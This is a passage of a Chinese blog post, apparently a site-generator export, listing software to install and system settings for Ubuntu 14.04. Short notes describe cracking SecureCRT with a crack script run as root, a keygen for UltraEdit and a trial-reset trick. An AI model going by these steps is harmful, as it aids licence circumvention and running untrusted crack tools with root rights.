chrome\n直接登录官方网站下载deb包。\nhttps://www.google.com/intl/zh-CN/chrome/browser/\n\n**注**：由于访问google需要翻墙，可以暂时下载百度网盘里的旧版本。\n\n\n### 3. 截图工具shutter\nubuntu软件中心可下载。\n\n14.04的shutter不提供自定义快捷键，可以利用系统自带的键盘快捷键设置来达到目的。\n\n**设置自定义快捷键方法**：设置 -> 键盘 -> 快捷键 -> 自定义快捷键\n\n命令：\n> shutter -s\n\n**注**：系统自带的截图工具也不错。\n\n\n<!-- more -->\n\n### 4. unity-tweak-tool\nunity桌面配置工具, ubuntu软件中心可下载。\n\n命令：\n> sudo apt-get install unity-tweak-tool\n\n\n### 5. 极点五笔输入法\n使用系统自带的极点五笔输入法\n14.04的ibus与系统软件捆绑，ibus坏了，可能导致系统崩溃。慎装，更加不要做任何删除ibus操作。\n\n\n### 6. 安装gnome-panel\ngnome面板工具，包含 **gnome-desktop-item-edit** 命令，用于创建桌面图标。\n\n命令：\n> sudo apt-get install gnome-panel\n\n例如：\n> `gnome-desktop-item-edit ~/Desktop/ --create-new`\n> gnome-desktop-item-edit ~/Desktop/app.desktop\n\n\n### 7. 百度准入go-bnac\n百度网盘里应该有。\n在百度工作专用，用于linux环境下连接百度准入。\n\n\n### 8. bcompare\n安装包，百度网盘有。\n**注**：依赖ia32-libs\n\n\n### 9. RabbitVCS\n安装步骤：\n> sudo add-apt-repository ppa:rabbitvcs/ppa\n> sudo apt-get update\n> sudo apt-get install rabbitvcs-core rabbitvcs-cli rabbitvcs-nautilus3 rabbitvcs-gedit\n\n**说明**：重启文档管理器，使用rabbitvcs-nautilus3生效。\n> nautilus -q\n\n**注**：不同的系统版本可能需要替换 rabbitvcs-nautilus3 为 rabbitvcs-nautilus 。另外，rabbitvcs-gedit 如无需要的话，可以不安装。\n\n**参考**：[ubuntu软件—RabbitVCS : TortoiseSVN 的替代者][^1]\n\n\n### 10. VPN工具\n优先使用cisco Anyconnect VPN Tool。\n\n如果连接不成功，则可以考虑安装openconnect。\n安装命令：\n> sudo apt-get install network-manager-openconnect-gnome\n\n连接VPN命令：\n> sudo openconnect vpn.sohu-inc.com\n\n\n### 11. 右键在当前位置打开终端\n命令：\n> sudo apt-get install nautilus-open-terminal\n\n**注**：安装完成后，需要重启文件管理器\n> nautilus -q\n\n\n### 12. 设置chrome代理\n**百度工作**：使用chrome插件 **Proxy SwitchySharp** 加载公司代理配置。\n**搜狐工作**：购买红杏网页浏览代理服务，并下载红杏chrome插件使用。\n\n\n### 13. ubuntu打印机\n**百度工作**：\n参考http://wiki.babel.baidu.com/twiki/bin/view/Com/Pmo/Iit/Babel/Ubuntu%E5%AE%89%E8%A3%85%E5%85%AC%E5%8F%B8%E6%89%93%E5%8D%B0%E6%9C%BA\n\n\n### 14. 经典菜单classicmenu-indicator\nubuntu软件中心有下载。\n\n命令：\n> `sudo apt-get install --fix-missing classicmenu-indicator`\n\n\n### 15. rar/zip格式压缩工具\n压缩&解压功能，能与ubuntu自带的归档管理器集成。\n\n安装命令：\n> sudo apt-get install rar unrar p7zip-full\n\n卸载命令：\n> sudo apt-get remove rar unrar p7zip-full\n\n\n### 16. chmsee\n命令：\n> sudo apt-get install chmsee\n\n软件源里可能没有chmsee，网上有已经打包好的deb包。\n**注**：由于ubuntu14.04软件库未提供命令下载，网上有已经打包好的deb包。百度网盘里有下载好的64位chmsee：chmsee_1.3.1.1-1~getdeb2_amd64.deb\n\n**参考**：[chmsee_1.3.1.1-1~getdeb2_amd64.deb][^2]\n\n\n### 17. virtualbox\n命令：\n> sudo apt-get install virtualbox-qt\n\n\n### 18. LONGENE QQ2013\n**前提条件**：64位系统需要安装ia32-libs\n\n安装步骤：\n> deb http://archive.ubuntu.com/ubuntu/ raring main restricted universe multiverse\n> sudo apt-get update\n> sudo apt-get install ia32-libs\n> sudo dpkg -i WineQQ2013-20131120-Longene.deb\n\n**注**：WineQQ2012-20121221-Longene.deb已经不让用，而新版本WineQQ2013SP6-20140102-Longene.deb界面又有问题。可以考虑使用webqq + 虚拟机的方式工作。\n\n**参考**：[wine qq 2013 for linux Ubuntu 64位兼容][^3]\n\n\n### 19. markdown编辑器haroopad\n**下载地址**：http://pad.haroopress.com/user.html\n\n\n### 20. wps-office\n**下载地址**：http://linux.wps.cn/\n\n安装字体管理器命令：\n> sudo apt-get install font-manager\n\n**注**：字体安装有问题，过程可能需要执行exe程序，比较坑，建议不使用需要的字段。(使用过程不会报错)\n\n\n### 21. 有道词典\n**下载地址**：http://cidian.youdao.com/index-linux.html\n\n**说明**：\n使用过程发现会系统出现卡顿的现象。所以，不使用时，最好关闭客户端。\n英文发音有问题。\n\n\n### 22. flashplayer独立播放器\n**下载地址**：http://fpdownload.macromedia.com/pub/flashplayer/updaters/11/flashplayer_11_sa.i386.tar.gz\n\n\n### 23. 切换默认的shell版本\n> sudo dpkg-reconfigure dash\n\n**参考**：[Shell编程笔记——Syntax error: \"(\" unexpected][^5]\n\n\n### 24. 百度网盘linux版\nDebian及基于Debian的发行版(比如ubuntu, linuxmint)请直接下载 bcloud-x.x.x.deb这个包, 然后双击deb包就能安装了;\n有些用户并没有安装apt包管理器的GUI界面, 也可以在终端里面安装:\n> $ sudo dpkg -i bcloud-x.x.x.deb\n> $ sudo apt-get -f install\n\n**参考**：\nhttps://github.com/LiuLang/bcloud\nhttps://github.com/LiuLang/bcloud-packages\n\n\n### 25. Ubuntu 14.04 64位字体美化(使用文泉驿微黑)\n> sudo aptitude install ttf-wqy-microhei\n\n**参考**：[Ubuntu 14.04 64位字体美化(使用文泉驿微黑)][^6]\n\n\n### 26. 安装gstreamer0.10-ffmpeg\n``` shell\nsudo add-apt-repository ppa:mc3man/trusty-media\nsudo apt-get update\nsudo apt-get install gstreamer0.10-ffmpeg\n```\n\n**参考**：[Ubuntu 14.04如何轻松启用H.264视频支持][11]\n\n\n\n### 27. 安装curl\n> sudo apt-get install curl\n\n\n\n## 二、开发软件\n\n### 1. 安装git\n命令：\n> sudo apt-get install git\n\n\n### 2. securecrt\nsecurecrt(使用securecrt_linux_crack.pl破解时，需要切换到root用户操作：su root)\n\n\n### 3. subversion\n**注**：可能安装rabbitvcs时已经安装\n\n命令：\n> sudo apt-get install subversion\n> sudo apt-get install libapache2-svn\n\n\n### 4. 安装mysql\n命令：\n> sudo apt-get install mysql-server\n> sudo apt-get install mysql-workbench\n\n\n### 5. java\n下载jdk bin或者tar.gz包，并安装。\n\n修改java配置 ~/.profile\n``` shell\nJAVA_HOME=/home/yeshaoting/java/jdk/jdk1.7.0_51\nCLASSPATH=$JAVA_HOME/jre/lib\nPATH=$PATH:$JAVA_HOME/bin\nexport JAVA_HOME CLASSPATH PATH\n```\n\n\n### 6. eclipse／STS\n**最新的STS下载地址**：http://spring.io/tools/sts/\n\n\n### 7. maven\n\n\n## 三、系统配置\n\n### 1. 设置root密码\n命令：\n> sudo passwd root\n\n\n### 2. 合上笔记本不休眠\n编辑/etc/default/acpi-support\n找到内容：LOCK_SCREEN=true，并修改为：LOCK_SCREEN=false\n\n\n### 3. 中文语言支持\n\n\n### 4. 用户目录英文名\n中文ubuntu里用户目录里的路径改成英文\n\n执行命令：\n> export LANG=en_US\n> xdg-user-dirs-gtk-update\n\n接下来，会跳出对话框询问：是否将目录转化为英文路径，同意并关闭。\n在终端中输入命令：export LANG=zh_CN\n关闭终端，并重起。下次进入系统，系统会提示是否把转化好的目录改回中文。\n选择不再提示，并取消修改。\n主目录的中文转英文就完成了~\n\n\n### 5. 自动挂载windows分区\n查看硬盘的分区情况：\n`df -h` 或者 `sudo fdisk -l` 或者使用GParted分区编辑器查看。\n\n编辑/etc/fstab文件，添加如下内容：\n``` shell\n# auto mount C disk\n/dev/sda1 /home/yeshaoting/windows/C ntfs-3g defaults,locale=zh_CN.UTF-8,umask=022 0 0\n\n# auto mount D disk\n/dev/sda5 /home/yeshaoting/windows/D ntfs-3g defaults,locale=zh_CN.UTF-8,umask=0,uid=1000,gid=1000 0 0\n\n# auto mount E disk\n/dev/sda6 /home/yeshaoting/windows/E ntfs-3g defaults,locale=zh_CN.UTF-8,umask=0,uid=1000,gid=1000 0 0\n```\n\n**说明**：umask=022表示只读，umask=0表示可读写，uid和gid设置所属权限（可以通过id username命令）。\n\n\n### 6. Eclipse设置 Javadoc背景色\n命令：\n> cd /usr/share/themes/Ambiance/gtk-2.0\n> sudo gedit gtkrc\n\n最终12.04及14.04修改gtkrc文件内容如下：\n``` shell\ngtk-color-scheme = \"base_color:#C7EDCC\\nfg_color:#4c4c4c\\ntooltip_fg_color:#000000\\nselected_bg_color:#f07746\\nselected_fg_color:#FFFFFF\\ntext_color:#3C3C3C\\nbg_color:#f6f4f2\\ntooltip_bg_color:#f2edbc\\nlink_color:#DD4814\"\n```\n\n**参考**：[Ubuntu 12.04 Eclipse设置 Javadoc背景色][^4]\n\n\n### 7. thundbird exchange插件ExQuilla\n\n\n\n## 四、软件储备\n\n### 1. Ubuntu下的阿里旺旺软件\n阿里旺旺的 Ubuntu 下的版本，下载地址是：http://ge.tt/8sPpGIA\n**注**：百度网盘里有。\n\n如遇无法登陆的情况，解除登陆限制即可。\n\n**参考**：http://wowubuntu.com/aliwangwang.html\n\n\n### 3.UltraEdit\n下载页面：http://www.ultraedit.com/downloads/uex.html\n下载地址：http://www.ultraedit.com/files/uex/Ubuntu/\n**注**：百度网盘里有。\n\n#### 关于破解\n1. 下载破解器：keygen_ue(百度网盘里有)\n2. 删除配置目录：~/.idm/uex/uex.conf\n\n**参考**：\n[UltraEdit for Linux破解][^7]\n[UltraEdit for linux 不断试用30天的方法 ][^8]\n\n\n### 4. UltraCompareX\n下载页面：http://www.ultraedit.com/downloads/ucx.html\n下载地址：http://www.ultraedit.com/files/ucx/Ubuntu/\n\n**注**：百度网盘里有。\n\n\n### 5. 飞鸽传书GNU/Linux版\n命令：\n> sudo apt-get install iptux\n\n下载地址：https://code.google.com/p/iptux/downloads/list\n\n**参考**：[信使][^10]\n\n\n### 6. winusb\n安装命令：\n``` shell\nsudo add-apt-repository ppa:colingille/freshlight\nsudo apt-get update\nsudo apt-get install winusb\n```\n\n**参考**：[WinUSB][^9]\n\n\n### 7. kwplayer\n需要下载 python3-xlib_xx.deb, python3-keybinder_xx.deb, kwplayer_xx.deb 这 三个软件包. 直接双击就能安装deb包.\n先安装python3-xlib, 之后是python3-keybinder, 最后是kwplayer.\n当然, 也可以在终端里安装, 比如:\n``` shell\nsudo dpkg -i kwplayer_xx.deb\nsudo apt-get -f install\n```\n\n**参考**：\nhttps://github.com/LiuLang/kwplayer\nhttps://github.com/LiuLang/kwplayer-packages\n\n\n### 8. Folder Color\n该软件已经集成到Ubuntu 15.04默认库中。\nubuntu14或ubuntu12想要安装此软件的话，需要额外添加软件库。\n\n安装命令如下：\n``` shell\nsudo add-apt-repository ppa:costales/folder-color\nsudo apt-get update\nsudo apt-get install folder-color\nnautilus -q\n```\n\n**参考**：[Folder Color 已添加到 Ubuntu 15.04 默认库中][^12]\n\n\n### ubuntu截图默认保存位置\n**参考**：[Default save directory for gnome-screenshot?][^13]\n\n\n\n[^1]: http://www.elain.org/?p=742\n[^2]: http://pkgs.org/ubuntu-14.04/getdeb-apps-amd64/chmsee_1.3.1.1-1~getdeb2_amd64.deb.html\n[^3]: http://www.longene.org/forum/viewtopic.php?t=4700\n[^4]: http://blog.csdn.net/qxb1229/article/details/8265616\n[^5]: http://blog.csdn.net/breeze5428/article/details/27353583\n[^6]: http://blog.csdn.net/tao_627/article/details/24180781\n[^7]: http://mjzhou.com/?p=158\n[^8]: http://blog.itpub.net/12216142/viewspace-708801\n[^9]: http://wiki.deepin.org/index.php?title=WinUSB\n[^10]: http://wiki.deepin.org/index.php?title=%E4%BF%A1%E4%BD%BF\n[^11]: http://imcn.me/html/y2014/19624.html\n[^12]: http://imcn.me/html/y2015/23176.html\n[^13]: http://askubuntu.com/a/134469\n","slug":"article/linux/ubuntu装机软件","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxt4004i5nbt8hdve0xe","content":"<p><img src=\"/asserts/images/logo/ubuntu.png\" class=\"img-logo img-center\"></p>\n<p>修改软件源为163的源。</p>\n<h2 id=\"一、应用软件\"><a href=\"#一、应用软件\" class=\"headerlink\" title=\"一、应用软件\"></a>一、应用软件</h2><h3 id=\"1-安装vim\"><a href=\"#1-安装vim\" class=\"headerlink\" title=\"1. 安装vim\"></a>1. 安装vim</h3><p>命令：</p>\n<blockquote>\n<p>sudo apt-get install vim</p>\n</blockquote>\n<h3 id=\"2-chrome\"><a href=\"#2-chrome\" class=\"headerlink\" title=\"2. chrome\"></a>2. chrome</h3><p>直接登录官方网站下载deb包。<br><a href=\"https://www.google.com/intl/zh-CN/chrome/browser/\" target=\"_blank\" rel=\"external\">https://www.google.com/intl/zh-CN/chrome/browser/</a></p>\n<p><strong>注</strong>：由于访问google需要翻墙，可以暂时下载百度网盘里的旧版本。</p>\n<h3 id=\"3-截图工具shutter\"><a href=\"#3-截图工具shutter\" class=\"headerlink\" title=\"3. 截图工具shutter\"></a>3. 截图工具shutter</h3><p>ubuntu软件中心可下载。</p>\n<p>14.04的shutter不提供自定义快捷键，可以利用系统自带的键盘快捷键设置来达到目的。</p>\n<p><strong>设置自定义快捷键方法</strong>：设置 -&gt; 键盘 -&gt; 快捷键 -&gt; 自定义快捷键</p>\n<p>命令：</p>\n<blockquote>\n<p>shutter -s</p>\n</blockquote>\n<p><strong>注</strong>：系统自带的截图工具也不错。</p>\n<a id=\"more\"></a>\n<h3 id=\"4-unity-tweak-tool\"><a href=\"#4-unity-tweak-tool\" class=\"headerlink\" title=\"4. unity-tweak-tool\"></a>4. unity-tweak-tool</h3><p>unity桌面配置工具, ubuntu软件中心可下载。</p>\n<p>命令：</p>\n<blockquote>\n<p>sudo apt-get install unity-tweak-tool</p>\n</blockquote>\n<h3 id=\"5-极点五笔输入法\"><a href=\"#5-极点五笔输入法\" class=\"headerlink\" title=\"5. 极点五笔输入法\"></a>5. 极点五笔输入法</h3><p>使用系统自带的极点五笔输入法<br>14.04的ibus与系统软件捆绑，ibus坏了，可能导致系统崩溃。慎装，更加不要做任何删除ibus操作。</p>\n<h3 id=\"6-安装gnome-panel\"><a href=\"#6-安装gnome-panel\" class=\"headerlink\" title=\"6. 安装gnome-panel\"></a>6. 安装gnome-panel</h3><p>gnome面板工具，包含 <strong>gnome-desktop-item-edit</strong> 命令，用于创建桌面图标。</p>\n<p>命令：</p>\n<blockquote>\n<p>sudo apt-get install gnome-panel</p>\n</blockquote>\n<p>例如：</p>\n<blockquote>\n<p><code>gnome-desktop-item-edit ~/Desktop/ --create-new</code><br>gnome-desktop-item-edit ~/Desktop/app.desktop</p>\n</blockquote>\n<h3 id=\"7-百度准入go-bnac\"><a href=\"#7-百度准入go-bnac\" class=\"headerlink\" title=\"7. 百度准入go-bnac\"></a>7. 百度准入go-bnac</h3><p>百度网盘里应该有。<br>在百度工作专用，用于linux环境下连接百度准入。</p>\n<h3 id=\"8-bcompare\"><a href=\"#8-bcompare\" class=\"headerlink\" title=\"8. bcompare\"></a>8. bcompare</h3><p>安装包，百度网盘有。<br><strong>注</strong>：依赖ia32-libs</p>\n<h3 id=\"9-RabbitVCS\"><a href=\"#9-RabbitVCS\" class=\"headerlink\" title=\"9. RabbitVCS\"></a>9. RabbitVCS</h3><p>安装步骤：</p>\n<blockquote>\n<p>sudo add-apt-repository ppa:rabbitvcs/ppa<br>sudo apt-get update<br>sudo apt-get install rabbitvcs-core rabbitvcs-cli rabbitvcs-nautilus3 rabbitvcs-gedit</p>\n</blockquote>\n<p><strong>说明</strong>：重启文档管理器，使用rabbitvcs-nautilus3生效。</p>\n<blockquote>\n<p>nautilus -q</p>\n</blockquote>\n<p><strong>注</strong>：不同的系统版本可能需要替换 rabbitvcs-nautilus3 为 rabbitvcs-nautilus 。另外，rabbitvcs-gedit 如无需要的话，可以不安装。</p>\n<p><strong>参考</strong>：<a href=\"http://www.elain.org/?p=742\" target=\"_blank\" rel=\"external\">ubuntu软件—RabbitVCS : TortoiseSVN 的替代者</a></p>\n<h3 id=\"10-VPN工具\"><a href=\"#10-VPN工具\" class=\"headerlink\" title=\"10. VPN工具\"></a>10. VPN工具</h3><p>优先使用cisco Anyconnect VPN Tool。</p>\n<p>如果连接不成功，则可以考虑安装openconnect。<br>安装命令：</p>\n<blockquote>\n<p>sudo apt-get install network-manager-openconnect-gnome</p>\n</blockquote>\n<p>连接VPN命令：</p>\n<blockquote>\n<p>sudo openconnect vpn.sohu-inc.com</p>\n</blockquote>\n<h3 id=\"11-右键在当前位置打开终端\"><a href=\"#11-右键在当前位置打开终端\" class=\"headerlink\" title=\"11. 右键在当前位置打开终端\"></a>11. 右键在当前位置打开终端</h3><p>命令：</p>\n<blockquote>\n<p>sudo apt-get install nautilus-open-terminal</p>\n</blockquote>\n<p><strong>注</strong>：安装完成后，需要重启文件管理器</p>\n<blockquote>\n<p>nautilus -q</p>\n</blockquote>\n<h3 id=\"12-设置chrome代理\"><a href=\"#12-设置chrome代理\" class=\"headerlink\" title=\"12. 设置chrome代理\"></a>12. 设置chrome代理</h3><p><strong>百度工作</strong>：使用chrome插件 <strong>Proxy SwitchySharp</strong> 加载公司代理配置。<br><strong>搜狐工作</strong>：购买红杏网页浏览代理服务，并下载红杏chrome插件使用。</p>\n<h3 id=\"13-ubuntu打印机\"><a href=\"#13-ubuntu打印机\" class=\"headerlink\" title=\"13. ubuntu打印机\"></a>13. ubuntu打印机</h3><p><strong>百度工作</strong>：<br>参考<a href=\"http://wiki.babel.baidu.com/twiki/bin/view/Com/Pmo/Iit/Babel/Ubuntu%E5%AE%89%E8%A3%85%E5%85%AC%E5%8F%B8%E6%89%93%E5%8D%B0%E6%9C%BA\" target=\"_blank\" rel=\"external\">http://wiki.babel.baidu.com/twiki/bin/view/Com/Pmo/Iit/Babel/Ubuntu%E5%AE%89%E8%A3%85%E5%85%AC%E5%8F%B8%E6%89%93%E5%8D%B0%E6%9C%BA</a></p>\n<h3 id=\"14-经典菜单classicmenu-indicator\"><a href=\"#14-经典菜单classicmenu-indicator\" class=\"headerlink\" title=\"14. 经典菜单classicmenu-indicator\"></a>14. 经典菜单classicmenu-indicator</h3><p>ubuntu软件中心有下载。</p>\n<p>命令：</p>\n<blockquote>\n<p><code>sudo apt-get install --fix-missing classicmenu-indicator</code></p>\n</blockquote>\n<h3 id=\"15-rar-zip格式压缩工具\"><a href=\"#15-rar-zip格式压缩工具\" class=\"headerlink\" title=\"15. rar/zip格式压缩工具\"></a>15. rar/zip格式压缩工具</h3><p>压缩&amp;解压功能，能与ubuntu自带的归档管理器集成。</p>\n<p>安装命令：</p>\n<blockquote>\n<p>sudo apt-get install rar unrar p7zip-full</p>\n</blockquote>\n<p>卸载命令：</p>\n<blockquote>\n<p>sudo apt-get remove rar unrar p7zip-full</p>\n</blockquote>\n<h3 id=\"16-chmsee\"><a href=\"#16-chmsee\" class=\"headerlink\" title=\"16. chmsee\"></a>16. chmsee</h3><p>命令：</p>\n<blockquote>\n<p>sudo apt-get install chmsee</p>\n</blockquote>\n<p>软件源里可能没有chmsee，网上有已经打包好的deb包。<br><strong>注</strong>：由于ubuntu14.04软件库未提供命令下载，网上有已经打包好的deb包。百度网盘里有下载好的64位chmsee：chmsee_1.3.1.1-1~getdeb2_amd64.deb</p>\n<p><strong>参考</strong>：<a href=\"http://pkgs.org/ubuntu-14.04/getdeb-apps-amd64/chmsee_1.3.1.1-1~getdeb2_amd64.deb.html\" target=\"_blank\" rel=\"external\">chmsee_1.3.1.1-1~getdeb2_amd64.deb</a></p>\n<h3 id=\"17-virtualbox\"><a href=\"#17-virtualbox\" class=\"headerlink\" title=\"17. virtualbox\"></a>17. virtualbox</h3><p>命令：</p>\n<blockquote>\n<p>sudo apt-get install virtualbox-qt</p>\n</blockquote>\n<h3 id=\"18-LONGENE-QQ2013\"><a href=\"#18-LONGENE-QQ2013\" class=\"headerlink\" title=\"18. LONGENE QQ2013\"></a>18. LONGENE QQ2013</h3><p><strong>前提条件</strong>：64位系统需要安装ia32-libs</p>\n<p>安装步骤：</p>\n<blockquote>\n<p>deb <a href=\"http://archive.ubuntu.com/ubuntu/\" target=\"_blank\" rel=\"external\">http://archive.ubuntu.com/ubuntu/</a> raring main restricted universe multiverse<br>sudo apt-get update<br>sudo apt-get install ia32-libs<br>sudo dpkg -i WineQQ2013-20131120-Longene.deb</p>\n</blockquote>\n<p><strong>注</strong>：WineQQ2012-20121221-Longene.deb已经不让用，而新版本WineQQ2013SP6-20140102-Longene.deb界面又有问题。可以考虑使用webqq + 虚拟机的方式工作。</p>\n<p><strong>参考</strong>：<a href=\"http://www.longene.org/forum/viewtopic.php?t=4700\" target=\"_blank\" rel=\"external\">wine qq 2013 for linux Ubuntu 64位兼容</a></p>\n<h3 id=\"19-markdown编辑器haroopad\"><a href=\"#19-markdown编辑器haroopad\" class=\"headerlink\" title=\"19. markdown编辑器haroopad\"></a>19. markdown编辑器haroopad</h3><p><strong>下载地址</strong>：<a href=\"http://pad.haroopress.com/user.html\" target=\"_blank\" rel=\"external\">http://pad.haroopress.com/user.html</a></p>\n<h3 id=\"20-wps-office\"><a href=\"#20-wps-office\" class=\"headerlink\" title=\"20. wps-office\"></a>20. wps-office</h3><p><strong>下载地址</strong>：<a href=\"http://linux.wps.cn/\" target=\"_blank\" rel=\"external\">http://linux.wps.cn/</a></p>\n<p>安装字体管理器命令：</p>\n<blockquote>\n<p>sudo apt-get install font-manager</p>\n</blockquote>\n<p><strong>注</strong>：字体安装有问题，过程可能需要执行exe程序，比较坑，建议不使用需要的字段。(使用过程不会报错)</p>\n<h3 id=\"21-有道词典\"><a href=\"#21-有道词典\" class=\"headerlink\" title=\"21. 有道词典\"></a>21. 有道词典</h3><p><strong>下载地址</strong>：<a href=\"http://cidian.youdao.com/index-linux.html\" target=\"_blank\" rel=\"external\">http://cidian.youdao.com/index-linux.html</a></p>\n<p><strong>说明</strong>：<br>使用过程发现会系统出现卡顿的现象。所以，不使用时，最好关闭客户端。<br>英文发音有问题。</p>\n<h3 id=\"22-flashplayer独立播放器\"><a href=\"#22-flashplayer独立播放器\" class=\"headerlink\" title=\"22. flashplayer独立播放器\"></a>22. flashplayer独立播放器</h3><p><strong>下载地址</strong>：<a href=\"http://fpdownload.macromedia.com/pub/flashplayer/updaters/11/flashplayer_11_sa.i386.tar.gz\" target=\"_blank\" rel=\"external\">http://fpdownload.macromedia.com/pub/flashplayer/updaters/11/flashplayer_11_sa.i386.tar.gz</a></p>\n<h3 id=\"23-切换默认的shell版本\"><a href=\"#23-切换默认的shell版本\" class=\"headerlink\" title=\"23. 切换默认的shell版本\"></a>23. 切换默认的shell版本</h3><blockquote>\n<p>sudo dpkg-reconfigure dash</p>\n</blockquote>\n<p><strong>参考</strong>：<a href=\"http://blog.csdn.net/breeze5428/article/details/27353583\" target=\"_blank\" rel=\"external\">Shell编程笔记——Syntax error: “(“ unexpected</a></p>\n<h3 id=\"24-百度网盘linux版\"><a href=\"#24-百度网盘linux版\" class=\"headerlink\" title=\"24. 百度网盘linux版\"></a>24. 百度网盘linux版</h3><p>Debian及基于Debian的发行版(比如ubuntu, linuxmint)请直接下载 bcloud-x.x.x.deb这个包, 然后双击deb包就能安装了;<br>有些用户并没有安装apt包管理器的GUI界面, 也可以在终端里面安装:</p>\n<blockquote>\n<p>$ sudo dpkg -i bcloud-x.x.x.deb<br>$ sudo apt-get -f install</p>\n</blockquote>\n<p><strong>参考</strong>：<br><a href=\"https://github.com/LiuLang/bcloud\" target=\"_blank\" rel=\"external\">https://github.com/LiuLang/bcloud</a><br><a href=\"https://github.com/LiuLang/bcloud-packages\" target=\"_blank\" rel=\"external\">https://github.com/LiuLang/bcloud-packages</a></p>\n<h3 id=\"25-Ubuntu-14-04-64位字体美化-使用文泉驿微黑\"><a href=\"#25-Ubuntu-14-04-64位字体美化-使用文泉驿微黑\" class=\"headerlink\" title=\"25. Ubuntu 14.04 64位字体美化(使用文泉驿微黑)\"></a>25. Ubuntu 14.04 64位字体美化(使用文泉驿微黑)</h3><blockquote>\n<p>sudo aptitude install ttf-wqy-microhei</p>\n</blockquote>\n<p><strong>参考</strong>：<a href=\"http://blog.csdn.net/tao_627/article/details/24180781\" target=\"_blank\" rel=\"external\">Ubuntu 14.04 64位字体美化(使用文泉驿微黑)</a></p>\n<h3 id=\"26-安装gstreamer0-10-ffmpeg\"><a href=\"#26-安装gstreamer0-10-ffmpeg\" class=\"headerlink\" title=\"26. 安装gstreamer0.10-ffmpeg\"></a>26. 安装gstreamer0.10-ffmpeg</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo add-apt-repository ppa:mc3man/trusty-media</div><div class=\"line\">sudo apt-get update</div><div class=\"line\">sudo apt-get install gstreamer0.10-ffmpeg</div></pre></td></tr></table></figure>\n<p><strong>参考</strong>：[Ubuntu 14.04如何轻松启用H.264视频支持][11]</p>\n<h3 id=\"27-安装curl\"><a href=\"#27-安装curl\" class=\"headerlink\" title=\"27. 安装curl\"></a>27. 安装curl</h3><blockquote>\n<p>sudo apt-get install curl</p>\n</blockquote>\n<h2 id=\"二、开发软件\"><a href=\"#二、开发软件\" class=\"headerlink\" title=\"二、开发软件\"></a>二、开发软件</h2><h3 id=\"1-安装git\"><a href=\"#1-安装git\" class=\"headerlink\" title=\"1. 安装git\"></a>1. 安装git</h3><p>命令：</p>\n<blockquote>\n<p>sudo apt-get install git</p>\n</blockquote>\n<h3 id=\"2-securecrt\"><a href=\"#2-securecrt\" class=\"headerlink\" title=\"2. securecrt\"></a>2. securecrt</h3><p>securecrt(使用securecrt_linux_crack.pl破解时，需要切换到root用户操作：su root)</p>\n<h3 id=\"3-subversion\"><a href=\"#3-subversion\" class=\"headerlink\" title=\"3. subversion\"></a>3. subversion</h3><p><strong>注</strong>：可能安装rabbitvcs时已经安装</p>\n<p>命令：</p>\n<blockquote>\n<p>sudo apt-get install subversion<br>sudo apt-get install libapache2-svn</p>\n</blockquote>\n<h3 id=\"4-安装mysql\"><a href=\"#4-安装mysql\" class=\"headerlink\" title=\"4. 安装mysql\"></a>4. 安装mysql</h3><p>命令：</p>\n<blockquote>\n<p>sudo apt-get install mysql-server<br>sudo apt-get install mysql-workbench</p>\n</blockquote>\n<h3 id=\"5-java\"><a href=\"#5-java\" class=\"headerlink\" title=\"5. java\"></a>5. java</h3><p>下载jdk bin或者tar.gz包，并安装。</p>\n<p>修改java配置 ~/.profile<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">JAVA_HOME=/home/yeshaoting/java/jdk/jdk1.7.0_51</div><div class=\"line\">CLASSPATH=$JAVA_HOME/jre/lib</div><div class=\"line\">PATH=$PATH:$JAVA_HOME/bin</div><div class=\"line\">export JAVA_HOME CLASSPATH PATH</div></pre></td></tr></table></figure></p>\n<h3 id=\"6-eclipse／STS\"><a href=\"#6-eclipse／STS\" class=\"headerlink\" title=\"6. eclipse／STS\"></a>6. eclipse／STS</h3><p><strong>最新的STS下载地址</strong>：<a href=\"http://spring.io/tools/sts/\" target=\"_blank\" rel=\"external\">http://spring.io/tools/sts/</a></p>\n<h3 id=\"7-maven\"><a href=\"#7-maven\" class=\"headerlink\" title=\"7. maven\"></a>7. maven</h3><h2 id=\"三、系统配置\"><a href=\"#三、系统配置\" class=\"headerlink\" title=\"三、系统配置\"></a>三、系统配置</h2><h3 id=\"1-设置root密码\"><a href=\"#1-设置root密码\" class=\"headerlink\" title=\"1. 设置root密码\"></a>1. 设置root密码</h3><p>命令：</p>\n<blockquote>\n<p>sudo passwd root</p>\n</blockquote>\n<h3 id=\"2-合上笔记本不休眠\"><a href=\"#2-合上笔记本不休眠\" class=\"headerlink\" title=\"2. 合上笔记本不休眠\"></a>2. 合上笔记本不休眠</h3><p>编辑/etc/default/acpi-support<br>找到内容：LOCK_SCREEN=true，并修改为：LOCK_SCREEN=false</p>\n<h3 id=\"3-中文语言支持\"><a href=\"#3-中文语言支持\" class=\"headerlink\" title=\"3. 中文语言支持\"></a>3. 中文语言支持</h3><h3 id=\"4-用户目录英文名\"><a href=\"#4-用户目录英文名\" class=\"headerlink\" title=\"4. 用户目录英文名\"></a>4. 用户目录英文名</h3><p>中文ubuntu里用户目录里的路径改成英文</p>\n<p>执行命令：</p>\n<blockquote>\n<p>export LANG=en_US<br>xdg-user-dirs-gtk-update</p>\n</blockquote>\n<p>接下来，会跳出对话框询问：是否将目录转化为英文路径，同意并关闭。<br>在终端中输入命令：export LANG=zh_CN<br>关闭终端，并重起。下次进入系统，系统会提示是否把转化好的目录改回中文。<br>选择不再提示，并取消修改。<br>主目录的中文转英文就完成了~</p>\n<h3 id=\"5-自动挂载windows分区\"><a href=\"#5-自动挂载windows分区\" class=\"headerlink\" title=\"5. 自动挂载windows分区\"></a>5. 自动挂载windows分区</h3><p>查看硬盘的分区情况：<br><code>df -h</code> 或者 <code>sudo fdisk -l</code> 或者使用GParted分区编辑器查看。</p>\n<p>编辑/etc/fstab文件，添加如下内容：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"># auto mount C disk</div><div 